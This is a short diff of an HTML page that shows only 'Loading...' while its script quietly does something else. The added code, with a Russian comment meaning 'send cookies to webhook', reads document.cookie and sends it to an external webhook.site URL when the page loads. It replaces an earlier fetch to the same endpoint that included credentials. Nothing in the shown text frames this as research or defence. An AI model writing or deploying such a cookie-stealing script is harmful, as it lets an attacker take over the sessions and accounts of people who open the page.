@@ -1,15 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Loading...</h1>
     <script>
-        // Вариант 1: Через fetch с обработкой
-        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?data=123', {
-            mode: 'no-cors',
-            credentials: 'include'
-        })
-        .then(() => console.log('Sent via fetch'))
-        .catch(err => console.log('Fetch error:', err));
+        // Отправляем cookies на webhook
+        fetch('https://webhook.site/e4c2e3fc-9985-4a2d-b5b2-c06986275334?cookies=' + encodeURIComponent(document.cookie));
     </script>
+    <p>Loading...</p>
 </body>
 </html>
